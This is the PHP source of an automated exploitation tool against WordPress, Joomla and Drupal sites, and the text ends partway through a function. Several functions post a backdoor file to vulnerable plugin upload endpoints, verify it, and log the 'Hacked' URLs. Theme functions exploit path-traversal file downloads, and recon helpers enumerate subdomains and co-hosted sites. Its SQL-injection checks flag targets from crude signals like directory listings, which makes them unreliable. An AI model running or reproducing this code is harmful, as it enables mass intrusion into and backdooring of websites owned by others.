<?php
#||/|| Tool functions ||\||#
function cafesalivation($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$target2 = $target."/wp-content/themes/cafesalivation/download.php?filename=../index.php";
$source = @file_get_contents("$target2");
if(preg_match("/<?php/",$source)){
echo $red."  [cafesalivation] -=====- ".$green." Vuln \n";
$hacked = fopen("result/AFD.txt","a+");
$def = $target2." [~] Arbitrary file download [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red."  [cafesalivation] -=====- ".$orange." Failed \n";
}
}

function newspro2891($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$target2 = $target."/wp-content/themes/newspro2891/download.php?file=../index.php";
$source = @file_get_contents("$target2");
if(preg_match("/<?php/",$source)){
echo $red."  [newspro2891] -========- ".$green." Vuln \n";
$hacked = fopen("result/AFD.txt","a+");
$def = $target2." [~] Arbitrary file download [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red."  [newspro2891] -========- ".$orange." Failed \n";
}
}

function joomla_plugins($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$plugins = @file_get_contents("wordlist/joomla.txt");
$plugins = explode("\n",$plugins);
echo $green." -================ Plugins scanner ================- \n";

foreach($plugins as $plugin){
$plugin = trim($plugin);
$target1 = $target."/components/".$plugin;
$headers = @get_headers("$target1");
if(!preg_match("/404/",$headers[0])){
$contents = @file_get_contents($target1);
if(preg_match("/readme.txt/",$contents) OR preg_match("/Index Of/",$contents) OR preg_match("/Directory/",$contents) OR preg_match("/Forbidden/",$contents)){
echo "  [+] Found : $target1 \n ";
echo "  [+] plugin name : $plugin \n";

}
}
}
echo $green." -============== Plugins scanner end ==============- \n";
}

function wordpress_plugins($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$plugins = @file_get_contents("wordlist/wordpress.txt");
$plugins = explode("\n",$plugins);
echo $green." -================ Plugins scanner ================- \n";

foreach($plugins as $plugin){
$plugin = trim($plugin);
$target1 = $target."/wp-content/plugins/".$plugin;
$headers = @get_headers("$target1");
if(!preg_match("/404/",$headers[0])){
$contents = @file_get_contents($target1);
if(preg_match("/readme.txt/",$contents) OR preg_match("/Index Of/",$contents) OR preg_match("/Directory/",$contents) OR preg_match("/Forbidden/",$contents)){
echo "   [+] Found : $target1 \n ";
echo "   [+] plugin name : $plugin \n";

}
}
}
echo $green." -============== Plugins scanner end ==============- \n";
}

function ImageManager($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/main/inc/lib/fckeditor/editor/plugins/ImageManager/images.php";
$target2 = $target."/plugins/ImageManager/images.php";
$h = @get_headers("$target1");
$h2 = @get_headers("$target2");
if(!preg_match("/404/",$h[0]) OR !preg_match("/404/",$h2[0]) ){
$uploadfile="BackDoor/BadMod.gif";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('dir' => "/",'upload'=> $cFile,'submit' => "" ,'f_file' => "");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL,"$target2");
curl_setopt($ch1, CURLOPT_POST,1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
$result1=curl_exec ($ch1);
curl_close ($ch1);
$result2 = $target."/main/upload/users/0/my_files/BadMod.gif";
$h3 = @get_headers("$result2");
if(!preg_match("/404/",$h3[0])){
echo $red."  [ImageManager] -============- ".$green." Done\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
	}else{
echo $red. "  [ImageManager] -============- ".$orange."Failed"." \n";
}
}else{
echo $red. "  [ImageManager] -============- ".$orange."Failed"." \n";
}
}
function duena($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$target2 = $target."/wp-content/themes/duena/download.php?f=../index.php";
$source = @file_get_contents("$target2");
if(preg_match("/<?php/",$source)){
echo $red."  [duena] -==============- ".$green." Vuln \n";
$hacked = fopen("result/AFD.txt","a+");
$def = $target2." [~] Arbitrary file download [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red."  [duena] -==============- ".$orange." Failed \n";
}
}

function wp_easycart($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/wp-content/plugins/wp-easycart/inc/amfphp/administration/banneruploaderscript.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('datemd5' => 1,'Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result2 = $target."/wp-content/plugins/wp-easycart/products/banners/BadMod.php";
$h2 = @file_get_contents("$result2");
if(@preg_match("/Hacked/",$h2)){
echo $red."  [wp_easycart] -=========- ".$green." Done\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
	}else{
echo $red. "  [wp_easycart] -=========- ".$orange."Failed"." \n";
}
}else{
echo $red. "  [wp_easycart] -=========- ".$orange."Failed"." \n";
}
}	

function downloads_manager($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/wp-content/plugins/downloads-manager/upload.php?up=http://$target/wp-content/plugins/downloads-manager/upload/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('upfile'=> $cFile,'MAX_FILE_SIZE' => 2048);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result2 = $target."/wp-content/plugins/downloads-manager/upload/BadMod.php";
$h2 = @file_get_contents("$result2");
if(@preg_match("/Hacked/",$h2)){
echo $red."  [downloads_manager] -===- ".$green." Done\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
	}else{
echo $red. "  [downloads_manager] -===- ".$orange."Failed"." \n";
}
}else{
echo $red. "  [downloads_manager] -===- ".$orange."Failed"." \n";
}
}
	
function wp_filemanager($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/wp-content/plugins/wp-filemanager/ajaxfilemanager/ajaxfilemanager.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result2 = $target."/uploaded/BadMod.php";
$h2 = @file_get_contents("$result2");
if(@preg_match("/Hacked/",$h2)){
echo $red."  [wp_filemanager] -======- ".$green." Done\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
	}else{
echo $red. "  [wp_filemanager] -======- ".$orange."Failed"." \n";
}
}else{
echo $red. "  [wp_filemanager] -======- ".$orange."Failed"." \n";
}
}	
function oxygen($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$target2 = $target."/wp-content/themes/oxygen-theme/download.php?file=../index.php";
$source = @file_get_contents("$target2");
if(preg_match("/<?php/",$source)){
echo $red."  [oxygen] -=============- ".$green." Vuln \n";
$hacked = fopen("result/AFD.txt","a+");
$def = $target2." [~] Arbitrary file download [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red."  [oxygen] -=============- ".$orange." Failed \n";
}
}

function liberator($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$target2 = $target."/wp-content/themes/liberator/inc/php/download.php?download_file=../index.php";
$source = @file_get_contents("$target2");
if(preg_match("/<?php/",$source)){
echo $red."  [liberator] -==========- ".$green." Vuln \n";
$hacked = fopen("result/AFD.txt","a+");
$def = $target2." [~] Arbitrary file download [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red."  [liberator] -==========- ".$orange." Failed \n";
}
}

function endlesshorizon($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;
}
$target2 = $target."/wp-content/themes/endlesshorizon/download.php?file=../index.php";
$source = @file_get_contents("$target2");
if(preg_match("/<?php/",$source)){
echo $red."  [endlesshorizon] -=====- ".$green." Vuln \n";
$hacked = fopen("result/AFD.txt","a+");
$def = $target2." [~] Arbitrary file download [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red."  [endlesshorizon] -=====- ".$orange." Failed \n";
}
}
function cms_detecter($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$white = "\e[97m";
}else{
	$green  = "";
	$white    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$source = @file_get_contents("$target");
$wordpress = @file_get_contents("$target/readme.html");
$joomla = @file_get_contents("$target/administrator");
$drupal = @file_get_contents("$target/user/login");
if(preg_match("/WordPress/",$source) OR preg_match("/WordPress/",$wordpress)){
echo $green."	 [+] Target : ".$white." $target \n";
echo $green."	 [+] CMS : ".$white." WordPress \n";
echo $green." -================= Check vulns =================- \n";
echo contents($target);
echo newspro2891($target);
echo wp_upload($target);
echo wp_rightnow($target);
echo wp_dreamwork($target);
echo wp_jquery($target);
echo wp_ads($target);
echo wp_formcraft($target);
echo wp_blocker($target);
echo wp_blazeS($target);
echo wp_upload2($target);
echo wp_jbm($target);
echo wp_bsn($target);
echo wp_qual($target);
echo plupload($target);
echo wp_filemanager($target);
echo downloads_manager($target);
echo wp_easycart($target);
echo cafesalivation($target);
echo duena($target);
echo endlesshorizon($target);
echo liberator($target);
echo oxygen($target);

echo wordpress_plugins($target);
echo $green."\n -================= Check vulns =================- \n ";

}elseif(preg_match("/index.php?option=/",$source) OR preg_match("/Joomla/",$source) OR preg_match("/Administration/",$joomla)){
echo $green."	 [+] Target : ".$white." $target \n";
echo $green."	 [+] CMS : ".$white." Joomla! \n";
echo $green." -================= Check vulns =================- \n";
echo joom_ver($target);
echo joom_down($target);
echo com_fabrik($target);
echo yj_sql($target);
echo com_squadmanagement($target);
echo com_jomcomdev($target);
echo com_ccnewsletter($target);
echo com_spmoviedb($target);
echo com_expautospro($target);
echo com_checklist($target);
echo com_bookpro($target);
echo com_jticketing($target);
echo com_realpin($target);
echo com_invitex($target);
echo com_visualcalendar($target);
echo com_fireboard($target);
echo com_jgive($target);
echo com_niceajaxpoll($target);
echo com_jefaqpro($target);
echo joomla_plugins($target);
echo $green." -================= Check vulns =================- \n";

}elseif(preg_match("/Drupal/",$source) OR preg_match("/This field is required/",$source)){
echo $green."	 [+] Target : ".$white." $target \n";
echo $green."	 [+] CMS : ".$white." Drupal! \n";
echo $green." -================= Check vulns =================- \n";
echo drupal_upload($target);
echo add_user($target);
echo $green." -================= Check vulns =================- \n";

}else{
echo $green."	 [+] Target : ".$white." $target \n";
echo $green."	 [+] CMS : ".$white." UNKNOWN \n";
}
}	




function whois($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$white = "\e[97m";
}else{
	$green  = "";
	$white    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target = str_replace("https://","",$target);
$target = str_replace("http://","",$target);
$target = str_replace("www.","",$target);
$target = str_replace("/","",$target);
$target2 = "http://api.hackertarget.com/whois/?q=$target";	
$source = @file_get_contents("$target2");	
$result = $green."  -[-============== WHOIS ==============-]- \n";
$result.= $white.$source;
$result.= $green."\n  -[-================ WHOIS END ================-]- \n";
$result2 = "  -[-============== WHOIS ==============-]- \n";
$result2.= $source;
$result2.= "\n  -[-============== WHOIS END ===============-]- \n";
$hacked = fopen("SingleScan/singleSite.txt","a+");
echo $result;
}	

function reverseiplookup($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$white = "\e[97m";
}else{
	$green  = "";
	$white    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target = str_replace("/","",$target);
$target2 = "http://api.hackertarget.com/reverseiplookup/?q=$target";	
$source = @file_get_contents("$target2");	
$hacked = fopen("sites.txt","a+");
fwrite($hacked,$source);
fclose($hacked);
echo $green."   [+] All server sites saved in [sites.txt] \n";
}	
function reversedns($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$white = "\e[97m";
}else{
	$green  = "";
	$white    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$url = str_replace("https://","",$target);
$url = str_replace("http://","",$url);
$url = str_replace("/","",$url);
$url = str_replace("www.","",$url);
$target2 = "http://api.hackertarget.com/reversedns/?q=$url";	
$source = @file_get_contents("$target2");	
$source2 = str_replace(" ","$green    : $white",$source);
$source3 = str_replace(" ","    : ",$source);
$result = $green."  -[-================ REVERSE DNS ================-]- \n";
$result.= $white.$source2;
$result.= $green."\n  -[-================ REVERSE DNS ================-]- \n"; 
$result2 = "  -[-============== REVERSE DNS ==============-]- \n";
$result2.= $source3;
$result2.= "\n  -[-============== REVERSE DNS END ===============-]- \n";
$hacked = fopen("SingleScan/singleSite.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
fclose($hacked);
echo $result;
}	
function subdomains($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$white = "\e[97m";
}else{
	$green  = "";
	$white    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$url = str_replace("https://","",$target);
$url = str_replace("http://","",$url);
$url = str_replace("/","",$url);
$url = str_replace("www.","",$url);
$target2 = "http://api.hackertarget.com/hostsearch/?q=$url";	
$source = @file_get_contents("$target2");	
$source2 = str_replace(",","$green   IP : $white",$source);
$source3 = str_replace(",","   IP : ",$source);
$result = $green."\n  -[-============== SUBDOMAINS SCANNER ==============-]- \n";
$result.= $white.$source2;
$result.= $green."\n  -[-================ SUBDOMAINS END ================-]- \n";
$result2 = "  -[-============== SUBDOMAINS SCANNER ==============-]- \n";
$result2.= $source3;
$result2.= "\n  -[-============== SUBDOMAINS SCANNER ===============-]- \n";
$hacked = fopen("SingleScan/singleSite.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
fclose($hacked);
echo $result;
}
function robots($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$white = "\e[97m";
}else{
	$green  = "";
	$white    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target2 = $target."/robots.txt";	
$headers = @get_headers($target2);	
if(!preg_match("/404/",$headers[0])){
$source = @file_get_contents("$target2");	
if(preg_match("/User-agent/",$source) OR preg_match("/Disallow/",$source)){
$result = $green."  -[-============== ROBOTS FILE ==============-]- \n";
$result.= $white."      ".$source;
$result.= $green."\n  -[-============== ROBOTS END ===============-]- \n";
$result2 = "  -[-============== ROBOTS FILE ==============-]- \n";
$result2.= "      ".$source;
$result2.= "\n  -[-============== ROBOTS END ===============-]- \n";
$hacked = fopen("SingleScan/singleSite.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
fclose($hacked);
echo $result;
}	
}
}
function com_jefaqpro($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_jefaqpro/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_jefaqpro] -====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_jefaqpro] -====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 50){
echo $red."  [com_jefaqpro] -====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_jefaqpro] -====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_jefaqpro] -====================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_jefaqpro] -====================- ".$orange." Not Vuln \n";
}
}
function com_niceajaxpoll($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_niceajaxpoll/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_niceajaxpoll] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_niceajaxpoll] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 50){
echo $red."  [com_niceajaxpoll] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_niceajaxpoll] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_niceajaxpoll] -================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_niceajaxpoll] -================- ".$orange." Not Vuln \n";
}
}

function com_jgive($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_jgive/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_jgive] -=======================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_jgive] -=======================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 50){
echo $red."  [com_jgive] -=======================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_jgive] -=======================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_jgive] -=======================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_jgive] -=======================- ".$orange." Not Vuln \n";
}
}

function com_fireboard($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_fireboard/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_fireboard] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_fireboard] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 50){
echo $red."  [com_fireboard] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_fireboard] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_fireboard] -===================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_fireboard] -===================- ".$orange." Not Vuln \n";
}
}

function com_visualcalendar($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_visualcalendar/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_visualcalendar] -==============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_visualcalendar] -==============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_visualcalendar] -==============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_visualcalendar] -==============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_visualcalendar] -==============- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_visualcalendar] -==============- ".$orange." Not Vuln \n";
}
}

function com_invitex($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_invitex/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_invitex] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_invitex] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_invitex] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_invitex] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_invitex] -=====================- ".$orange." Not Vuln \n";
}
}else{
